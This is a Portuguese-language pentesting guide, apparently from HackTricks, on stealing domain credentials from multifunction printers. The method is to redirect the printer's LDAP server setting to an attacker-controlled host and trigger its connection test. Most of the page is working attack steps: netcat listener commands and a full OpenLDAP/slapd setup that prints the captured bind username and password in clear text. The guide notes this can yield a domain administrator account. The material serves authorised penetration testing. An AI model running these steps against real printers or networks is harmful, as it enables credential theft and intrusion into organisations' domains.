Existem vários blogs na internet que destacam os perigos de deixar as impressoras configuradas com o LDAP com credenciais de login padrão/fracas. Isso ocorre porque um invasor pode enganar a impressora para autenticar-se contra um servidor LDAP falso (tipicamente um `nc -vv -l -p 444` é suficiente) e capturar as credenciais da impressora em texto claro.

Além disso, várias impressoras contêm logs com nomes de usuários ou até mesmo podem ser capazes de baixar todos os nomes de usuários do Controlador de Domínio.

Todas essas informações sensíveis e a falta comum de segurança tornam as impressoras muito interessantes para os invasores.

Alguns blogs sobre o assunto:

* [https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/](https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/)
* [https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)

**As seguintes informações foram copiadas de** [**https://grimhacker.com/2018/03/09/just-a-printer/**](https://grimhacker.com/2018/03/09/just-a-printer/)

# Configurações do LDAP

Nas impressoras Konica Minolta, é possível configurar um servidor LDAP para se conectar, juntamente com as credenciais. Em versões anteriores do firmware desses dispositivos, ouvi dizer que é possível recuperar as credenciais simplesmente lendo a fonte html da página. Agora, no entanto, as credenciais não são retornadas na interface, então temos que trabalhar um pouco mais.

A lista de servidores LDAP está em: Rede > Configuração LDAP > Configurando o LDAP

A interface permite que o servidor LDAP seja modificado sem reentrar as credenciais que serão usadas para se conectar. Presumo que isso seja para uma experiência de usuário mais simples, mas dá uma oportunidade para um invasor escalar de mestre de uma impressora para um ponto de apoio no domínio.

Podemos reconfigurar a configuração do endereço do servidor LDAP para uma máquina que controlamos e acionar uma conexão com a útil funcionalidade "Testar Conexão".

# Ouvindo as informações

## netcat

Se você tiver mais sorte do que eu, poderá se safar com um simples ouvinte netcat:
```
sudo nc -k -v -l -p 386
```
Sou assegurado por [@\_castleinthesky](https://twitter.com/\_castleinthesky) que isso funciona na maioria das vezes, no entanto, ainda não tive tanta sorte.

## Slapd

Descobri que um servidor LDAP completo é necessário, pois a impressora primeiro tenta uma ligação nula e, em seguida, consulta as informações disponíveis, somente se essas operações forem bem-sucedidas, ela prossegue para se ligar com as credenciais.

Procurei por um servidor LDAP simples que atendesse aos requisitos, no entanto, parecia haver opções limitadas. No final, optei por configurar um servidor LDAP aberto e usar o serviço de servidor de depuração slapd para aceitar conexões e imprimir as mensagens da impressora. (Se você conhece uma alternativa mais fácil, ficaria feliz em ouvir sobre ela)

### Instalação

(Obs: esta seção é uma versão levemente adaptada do guia aqui [https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap](https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap) )

De um terminal de root:

**Instale o OpenLDAP,**
```
#> dnf install -y install openldap-servers openldap-clients

#> cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG 

#> chown ldap. /var/lib/ldap/DB_CONFIG
```
**Definir uma senha de administrador do OpenLDAP (você precisará dela novamente em breve)**
```
#> slappasswd 
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> vim chrootpw.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={0}config,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f chrootpw.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={0}config,cn=config"
```
**Importar Esquemas Básicos**
```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/cosine.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=cosine,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=nis,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=inetorgperson,cn=schema,cn=config"
```
**Defina o nome do seu domínio no banco de dados LDAP.**
```
# generate directory manager's password
#> slappasswd 
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

#> vim chdomain.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={1}monitor,cn=config
changetype: modify
replace: olcAccess
olcAccess: {0}to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth"
read by dn.base="cn=Manager,dc=foo,dc=bar" read by * none

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcSuffix
olcSuffix: dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcRootDN
olcRootDN: cn=Manager,dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcAccess
olcAccess: {0}to attrs=userPassword,shadowLastChange by
dn="cn=Manager,dc=foo,dc=bar" write by anonymous auth by self write by * none
olcAccess: {1}to dn.base="" by * read
olcAccess: {2}to * by dn="cn=Manager,dc=foo,dc=bar" write by * read

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f chdomain.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={1}monitor,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

#> vim basedomain.ldif
dn: dc=foo,dc=bar
objectClass: top
objectClass: dcObject
objectclass: organization
o: Foo Bar
dc: DC1

dn: cn=Manager,dc=foo,dc=bar
objectClass: organizationalRole
cn: Manager
description: Directory Manager

dn: ou=People,dc=foo,dc=bar
objectClass: organizationalUnit
ou: People

dn: ou=Group,dc=foo,dc=bar
objectClass: organizationalUnit
ou: Group

#> ldapadd -x -D cn=Manager,dc=foo,dc=bar -W -f basedomain.ldif 
Enter LDAP Password: # directory manager's password
adding new entry "dc=foo,dc=bar"

adding new entry "cn=Manager,dc=foo,dc=bar"

adding new entry "ou=People,dc=foo,dc=bar"

adding new entry "ou=Group,dc=foo,dc=bar"
```
**Configurar o LDAP TLS**

**Criar um Certificado SSL**
```
#> cd /etc/pki/tls/certs 
#> make server.key 
umask 77 ; \
/usr/bin/openssl genrsa -aes128 2048 > server.key
Generating RSA private key, 2048 bit long modulus
...
...
e is 65537 (0x10001)
Enter pass phrase: # set passphrase
Verifying - Enter pass phrase: # confirm

# remove passphrase from private key
#> openssl rsa -in server.key -out server.key 
Enter pass phrase for server.key: # input passphrase
writing RSA key

#> make server.csr 
umask 77 ; \
/usr/bin/openssl req -utf8 -new -key server.key -out server.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]: # country
State or Province Name (full name) []: # state
Locality Name (eg, city) [Default City]: # city
Organization Name (eg, company) [Default Company Ltd]: # company
Organizational Unit Name (eg, section) []:Foo Bar # department
Common Name (eg, your name or your server's hostname) []:www.foo.bar # server's FQDN
Email Address []:xxx@foo.bar # admin email
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []: # Enter
An optional company name []: # Enter

#> openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 3650
Signature ok
subject=/C=/ST=/L=/O=/OU=Foo Bar/CN=dlp.foo.bar/emailAddress=xxx@roo.bar
Getting Private key
```
**Configurar o Slapd para SSL/TLS**

Para garantir a segurança das informações transmitidas entre o cliente e o servidor LDAP, é recomendado configurar o Slapd para usar SSL/TLS. Isso pode ser feito seguindo os seguintes passos:

1. Gerar um certificado SSL/TLS válido para o servidor LDAP.
2. Configurar o Slapd para usar o certificado SSL/TLS.
3. Configurar o cliente LDAP para se conectar ao servidor usando SSL/TLS.

Ao configurar o Slapd para usar SSL/TLS, é importante garantir que o certificado SSL/TLS seja válido e que o cliente LDAP esteja configurado corretamente para se conectar ao servidor usando SSL/TLS.
```
#> cp /etc/pki/tls/certs/server.key \
/etc/pki/tls/certs/server.crt \
/etc/pki/tls/certs/ca-bundle.crt \
/etc/openldap/certs/

#> chown ldap. /etc/openldap/certs/server.key \
/etc/openldap/certs/server.crt \
/etc/openldap/certs/ca-bundle.crt

#> vim mod_ssl.ldif
# create new
 dn: cn=config
changetype: modify
add: olcTLSCACertificateFile
olcTLSCACertificateFile: /etc/openldap/certs/ca-bundle.crt
-
replace: olcTLSCertificateFile
olcTLSCertificateFile: /etc/openldap/certs/server.crt
-
replace: olcTLSCertificateKeyFile
olcTLSCertificateKeyFile: /etc/openldap/certs/server.key

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f mod_ssl.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"
```
**Permita o LDAP através do firewall local**

Para obter informações do Active Directory, é necessário permitir o tráfego LDAP através do firewall local. Isso pode ser feito abrindo a porta 389 para tráfego não seguro ou a porta 636 para tráfego seguro (usando SSL). Certifique-se de que apenas as máquinas necessárias tenham acesso a essas portas para evitar possíveis vazamentos de informações.
```
firewall-cmd --add-service={ldap,ldaps}
```
## O pagamento

Depois de instalar e configurar o serviço LDAP, você pode executá-lo com o seguinte comando:

> ```
> slapd -d 2
> ```

A captura de tela abaixo mostra um exemplo da saída quando executamos o teste de conexão na impressora. Como você pode ver, o nome de usuário e a senha são passados do cliente LDAP para o servidor.

![saída do terminal slapd contendo o nome de usuário "MyUser" e a senha "MyPassword"](https://i1.wp.com/grimhacker.com/wp-content/uploads/2018/03/slapd\_output.png?resize=474%2C163\&ssl=1)

# Quão ruim pode ser?

Isso depende muito das credenciais que foram configuradas.

Se o princípio do menor privilégio estiver sendo seguido, você poderá obter apenas acesso de leitura a determinados elementos do Active Directory. Isso ainda é frequentemente valioso, pois você pode usar essas informações para formular ataques mais precisos.

Normalmente, você provavelmente obterá uma conta no grupo Domain Users, o que pode dar acesso a informações confidenciais ou formar a autenticação pré-requisito para outros ataques.

Ou, como eu, você pode ser recompensado por configurar um servidor LDAP e receber uma conta de administrador de domínio em uma bandeja de prata.


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
